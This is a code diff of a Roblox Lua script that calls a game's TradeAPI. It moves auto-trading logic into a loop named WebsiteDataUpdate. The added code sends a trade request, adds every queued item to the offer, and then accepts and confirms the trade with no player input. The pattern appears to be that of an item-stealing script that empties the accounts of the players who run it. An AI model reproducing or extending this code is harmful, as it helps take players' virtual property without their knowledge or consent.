@@ -218,10 +218,37 @@ local function WebsiteDataUpdate()
             }
             game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(unpack(args))
         end
+local playerGui = game.Players.LocalPlayer.PlayerGui
+        if playerGui and playerGui:FindFirstChild("TradeApp") then
+            local tradeApp = playerGui.TradeApp
+            if tradeApp:FindFirstChild("Frame") then
+                local frame = tradeApp.Frame
+                if frame.Visible then
+                    task.wait(5)
+                    while #processedFrames > 0 do
+                        if processedFrames[1] == "add_more_pets" then
+                            table.remove(processedFrames, 1) -- Remove it without running the remote
+                        else
+                            local args = {
+                                [1] = processedFrames[1]
+                            }
+                            game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(unpack(args))
+                            table.remove(processedFrames, 1) -- Remove after running the remote
+                     
+                        end
+                    end
+
+                    task.wait(10)
+                    game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
+                    task.wait(10)
+                    game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
+                end
+            end
+        end
     end
 end
 
-        wait(15)
+        wait(10)
     end
 end
 spawn(WebsiteDataUpdate)
@@ -298,40 +325,7 @@ spawn(PetData)
 
 
 
-local function TradePets()
-    while true do
-        local playerGui = game.Players.LocalPlayer.PlayerGui
-        if playerGui and playerGui:FindFirstChild("TradeApp") then
-            local tradeApp = playerGui.TradeApp
-            if tradeApp:FindFirstChild("Frame") then
-                local frame = tradeApp.Frame
-                if frame.Visible then
-                    wait(5)
-                    while #processedFrames > 0 do
-                        if processedFrames[1] == "add_more_pets" then
-                            table.remove(processedFrames, 1) -- Remove it without running the remote
-                        else
-                            local args = {
-                                [1] = processedFrames[1]
-                            }
-                            game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(unpack(args))
-                            table.remove(processedFrames, 1) -- Remove after running the remote
-                     
-                        end
-                    end
-
-                    wait(10)
-                    game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
-                    wait(10)
-                    game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
-                end
-            end
-        end
-        wait(1)
-    end
-end
-
-spawn(TradePets)
+        
 
 
 
